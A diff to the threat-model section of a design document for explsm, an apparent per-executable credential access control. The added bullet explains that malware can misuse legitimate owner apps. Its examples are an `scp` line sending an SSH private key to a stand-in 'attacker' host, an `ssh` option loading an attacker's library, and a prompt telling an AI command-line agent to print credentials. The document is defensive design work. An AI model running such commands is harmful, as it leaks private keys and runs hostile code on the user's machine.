@@ -52,6 +52,16 @@ whatever the policy explicitly grants.
 
 - **Identity is per exec image, not per code origin.** Plugins or `eval`
   inside an owner app run with the app's identity.
+- **Anyone who can start an owner app can use it.** Malware doesn't have to
+  get into the app; it runs the real one. `scp ~/.ssh/id_ed25519 attacker:`
+  is `scp` with the `ssh` identity and sends the key away;
+  `ssh -o PKCS11Provider=/tmp/evil.so` makes the real `ssh` load a library
+  the attacker chose; an app that acts on instructions (`claude -p "print
+  the credentials"`) exfiltrates on request. explsm doesn't yet check who
+  started an app or what code it maps; see section 9 of
+  [release-plan.md](release-plan.md). Until then, keep keys behind
+  `ssh-agent` with `ssh-add -c` or a FIDO key, and don't make apps that act
+  on instructions the owner of credentials that matter.
 - **Prompts are not blocking.** The first denied access fails with `EACCES`;
   approval takes effect on retry. fanotify permission events could hold an
   open while the user is asked, but BPF would have to allow those opens
